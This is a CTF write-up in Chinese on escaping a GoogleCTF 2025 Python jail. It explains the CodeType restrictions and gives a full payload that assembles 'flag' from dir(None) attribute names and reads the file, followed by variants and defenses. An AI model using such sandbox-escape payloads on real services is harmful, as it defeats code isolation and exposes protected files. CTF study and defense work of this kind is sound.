---
id: binary-pwn-sandbox-escape-python-codetype-none-dir-iterator-flag
title: GoogleCTF 2025 Internship pyjail：CodeType 常量/名字白名单 + 小整数打乱下用 dir(None) 迭代拼出 flag
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-codetype-none-dir-iterator-string-build
aliases:
- GoogleCTF Internship
- CodeType pyjail
- co_consts 只有 None
- dir(None) 迭代构造字符串
- 小整数缓存打乱
- Python 沙箱读 flag
- co_names 白名单绕过
tags:
- python
- pyjail
- sandbox-escape
- cpython
- codetype
- bytecode
- ctf
- google-ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V262
  verified_at: '2026-11-07T17:29:07+08:00'
  notes: V262 重核：对照正文与11图，CodeType(co_consts=(None,), co_names 白名单)、swap 用 ctypes.memmove 打乱小整数（1+2=30 见图）、dir(None) 顺序与 __format__/__bool__/__class__/__getattribute__ 取字符逻辑、f-string 拼接、open('flag').read()、Dockerfile COPY flag /home/user/ 与 Python 3.12.3 均一致；最终 flag{test} 回显见图。dedup 仅自匹配，其他候选 new。未本机执行 payload。
---

## 一句话结论

在只允许常量 `None`、全局名白名单 `p,dir,__iter__,f,__next__,print,open,read`、且用 `ctypes` 打乱 CPython 小整数缓存（`1+2` 会得到 30）的 Python jail 中，不依赖任何数字/字符串字面量，利用 `dir(None)` 返回的属性名列表和 `__iter__`/`__next__` 按固定次数取出 `__format__`、`__bool__`、`__class__`、`__getattribute__` 中的字符，用 f-string 拼出 `flag`，最后 `open("flag").read()` 读取文件。

## 原理

- **CodeType 重建限制**：题目把用户源码 `compile` 成字节码 `g.co_code`，再用 `types.CodeType(...)` 新建一个代码对象：`co_consts=(None,)`（常量只能是 `None`）、`co_names=('p','dir','__iter__','f','__next__','print','open','read')`（只能通过索引访问这些全局名）。因此用户源码不能写数字、字符串、其他变量名，也不能直接调用未列入白名单的函数。
- **co_names 的索引语义**：字节码里的 `LOAD_NAME` 通过索引访问 `co_names`。如果字节码加载了索引 0 的 `p`，而运行环境没有定义 `p`，就会 `NameError`；未被字节码访问的名字即使不在环境中也不会报错。所以 payload 必须给 `p` 等被加载的名字赋值。
- **小整数缓存被打乱**：`swap()` 用 `ctypes.string_at(id(1), 255*32)` 读取 CPython 小整数对象缓存，`random.shuffle` 后把每个 `Intern` 的整数值改写回内存。结果是整数对象的“值”与预期不一致——原文实测 `print(1+2)` 输出 `30`。这意味着任何依赖整数常量/索引/算术的 payload 都不可靠；payload 必须完全避开整数，用源码顺序和重复调用 `__next__` 的次数来控制。
- **用属性名字符串当字符源**：`dir(None)` 返回 `('__bool__','__class__','__delattr__','__dir__','__doc__','__eq__','__format__','__ge__','__getattribute__', ...)`。`list.__iter__()` 得到列表迭代器，连续调用 `__next__()` 可以按顺序取到第 N 个属性名（如 7 次取到 `__format__`）；再对取到的字符串调用 `__iter__()`，连续 `__next__()` 可以按位置取字符（如 `__format__` 的第 3 个字符是 `f`）。这样无需字符串字面量即可逐字符产出任意字母。
- **f-string 拼接**：`f"{p}"` 把当前字符/字符串转成 `str`，`read = f"{read}{p}"` 做字符串拼接；f-string 编译为 `FORMAT_VALUE`/`BUILD_STRING`，不依赖 `co_consts` 中的字符串常量，因此能在只允许 `None` 的代码对象里使用。
- **最终 Sink**：`print`、`open` 在 `co_names` 白名单中，`read` 是可赋值的普通名字。拼出 `flag` 后执行 `f=open(read).read()`、`print(f)`，直接读取当前目录的 flag 文件（Dockerfile 把 `flag` 复制到 `/home/user/`）。
- **为什么 `p` 必须定义、`f` 可以不定义**：`co_names` 顺序决定字节码索引；payload 让 `p` 先承载 `None`/`dir(None)`，而 `f` 只作为迭代器变量在后续赋值。原文观察到如果把 `co_names` 顺序换为 `f` 在前，则必须定义 `f` 而不是 `p`，说明限制来自“字节码索引访问的名字”而不是列表本身。
- **为什么中途不能随便用 print/open**：可用变量名只有 `p`、`f`、`read` 等极少数；把 `f` 赋成 `print`/`open` 后再当迭代器用会变成 `'str' object is not callable`，原文经 fuzz 后把 `print` 放到最后调用。

## 触发条件

- 目标用 `types.CodeType` 重建用户代码，`co_consts` 只含 `None`，`co_names` 为有限白名单，且未禁用 `dir`、`__iter__`、`__next__`、`object.__getattribute__` 等属性访问。
- 目标另外用 `ctypes`/`memmove` 打乱了 CPython 小整数缓存（或用户无法依赖整数运算），迫使 payload 避开数字。
- 白名单中包含 `open`/`print`（或可通过已白名单名字间接取得），且 flag 文件在当前工作目录/可读路径。
- Python 3.11+（题目使用 `co_qualname`/`co_linetable`/`co_exceptiontable` 等新 CodeType 字段；原文运行环境为 Python 3.12.3）。
- 仅用于 CTF/授权沙箱测试；不要在真实生产环境执行未知 jail 绕过。

## 利用步骤

1. 阅读 jail 源码，确认 `co_consts=(None,)` 与 `co_names` 白名单；在本地 Python 打印 `dir(None)`，记录属性名顺序与目标字符的位置。
2. 规划字符来源：`f` 取 `__format__` 第 3 个字符；`l` 取 `__bool__` 第 6 个字符；`a` 取 `__class__` 第 5 个字符；`g` 取 `__getattribute__` 第 3 个字符（按 `dir(None)` 的实际顺序调整）。
3. 用 `p = None` 初始化；`p = dir(None)`；`f = p.__iter__()`；连续 `p = f.__next__()` N 次选中属性名；再 `f = p.__iter__()`，连续 `p = f.__next__()` M 次选中字符。
4. 用 `read = f"{p}"` 保存第一个字符，后续用 `read = f"{read}{p}"` 追加字符，拼出 `flag`。
5. 最后 `print(read)` 确认拼写；`f = open(read).read()` 读取内容；`print(f)` 输出 flag。
6. 把 payload 逐行输入题目（空行结束输入），等待 `swap()` 打乱整数后执行；若 flag 文件名是 `flag.txt`，继续用同样方法拼出 `.txt` 追加。
7. 若中途报 `'str' object is not callable`，检查是否把 `f` 同时用作迭代器和 `print`/`open`；把 `print`/`open` 的使用挪到最后。

## PoC

原文最终 payload（可直接作为输入；`None` 是唯一常量，所有字母由 `dir(None)` 属性名迭代得到）：

```python
p = None
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
f=print
f=open
read=f"{p}"
p = dir(None)
f = p.__iter__()
p = f.__next__()
f = p.__iter__()
p=f.__next__()
p=f.__next__()
p=f.__next__()
p=f.__next__()
p=f.__next__()
p=f.__next__()
read=f"{read}{p}"
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
read=f"{read}{p}"
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
read=f"{read}{p}"
print(read)
f=open(read).read()
print(f)
```

各段含义：第 1 段从 `__format__` 取 `f`；第 2 段从 `__bool__` 取 `l`；第 3 段从 `__class__` 取 `a`；第 4 段从 `__getattribute__` 取 `g`；最后 `print(read)` 输出 `flag`，`open(read).read()` 读取 flag 文件。原文在容器中运行得到 `flag{test}`。

关键前置观察（原文）：

```text
>>> dir(None)
['__bool__','__class__','__delattr__','__dir__','__doc__','__eq__','__format__','__ge__','__getattribute__', ...]
>>> # 7 次 __next__ 后
>>> print(p)
__format__
>>> # 再对 __format__ 迭代 3 次
>>> print(p)
f
```

```text
>>> # swap() 打乱小整数后
>>> print(1 + 2)
30
```

## 变体与关联

- **字符源变体**：除 `dir(None)` 外，任何可迭代的字符串集合（`dir(())`、`dir("")`、`__doc__`、异常消息、属性名）都可作为字符源；选择包含目标字母且顺序稳定的对象即可。
- **文件名变体**：若 flag 文件名为 `flag.txt`/`/flag`，继续用同样方法拼出 `.`、`t`、`x`、`/` 等字符；`/` 可从路径字符串或属性名中取。
- **整数打乱变体**：若没有 `swap()`，可直接用数字常量/索引简化 payload；若有其他类型混淆/随机化，优先用迭代次数和固定属性顺序规避算术。
- **白名单变体**：若 `open` 不在白名单，可尝试用 `read`、`print` 之外的已白名单名字，或通过 `__getattribute__`/`__subclasses__` 恢复 builtins；若 `dir` 被移除，寻找其他返回字符串列表的白名单函数。
- **关联**：[[binary-pwn-sandbox-escape-python-generator-code-consts-leak]]（代码对象常量池泄露）、[[binary-pwn-sandbox-escape-python-ast-joinedstr-ctypes-open]]（f-string/AST 绕过与原生 open）、[[binary-pwn-sandbox-escape-pyjail-position-parity-quote-bypass]]（无引号构造字符串）、[[binary-pwn-sandbox-escape-python-dis-checker-break-bypass]]（CodeType/字节码修改类 jail）。

## 检测与防御

- **检测**：jail 输入中出现 `dir(`、`__iter__`、`__next__`、`f"{`、`open(` 等组合；代码对象 `co_consts` 只含 `None` 却出现字符串拼接/f-string；短时间大量 `__next__` 调用模式。
- **防御**：不要只靠 `co_names`/`co_consts` 白名单限制 Python 代码；禁用 `dir`、`__iter__`、`__next__`、`__getattribute__` 等可枚举属性/字符串的入口，或在独立进程/容器/seccomp 中运行并限制文件访问；flag 文件不要放在可读工作目录，使用最小权限用户与只读挂载。
- **注意**：此类 jail 绕过依赖 Python 版本与 CodeType 字段顺序；升级 Python 后需重新验证 `dir(None)` 顺序与字节码语义。CTF 环境外不要用未知 payload 测试生产服务。
